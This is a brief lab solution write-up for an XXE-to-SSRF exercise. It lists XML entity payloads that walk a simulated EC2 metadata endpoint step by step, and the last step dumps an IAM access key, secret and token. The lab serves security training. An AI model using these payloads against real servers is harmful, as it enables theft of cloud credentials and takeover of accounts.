Lab: Exploiting XXE to perform SSRF attacks
Vuln:The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.
Task: To obtain the server's IAM secret access key from the EC2 metadata endpoint.

Solution:
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]> -> "Invalid product ID: latest"

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest"> ]> -> "Invalid product ID: meta-data"

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data"> ]> -> "Invalid product ID: iam"

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam"> ]> -> "Invalid product ID: security-credentials"

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials"> ]> -> "Invalid product ID: admin"

<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]> -> "Invalid product ID: {
    "Code" : "Success",
    "LastUpdated" : "2025-07-01T07:19:49.050353150Z",
    "Type" : "AWS-HMAC",
    "AccessKeyId" : "9cJpu8zpSUx2CnrgBn39",
    "SecretAccessKey" : "PDdWLd4AR0s7VTm7gfq5MQlQQmjVdzgrgLjkSUMm",
    "Token" : "Srzc6q15Mf2zZjpNTTzvGkhXM9JnDFGV3CeLRtSP5AmHB9qrMH2oPwIu6pwLBGAY7SilXIJNkRncbiyoM3gevZD6WMQmEZmr7y1ZLxlVUMkT3aLONBSb9HCLucEnj1BtU7EZFBGv3NCJ4O1MehAjS5SyZe0hiVBMuf9BRD01VgY6F0iC0fU3n1gQIbXp7brpd4YBWjj6VrFPzUpFrCMzSwUAR1R1s8f9LHA6mNu1QSnaHHJXZ0OnwHKOyRglipSI",
    "Expiration" : "2031-06-30T07:19:49.050353150Z"
    }"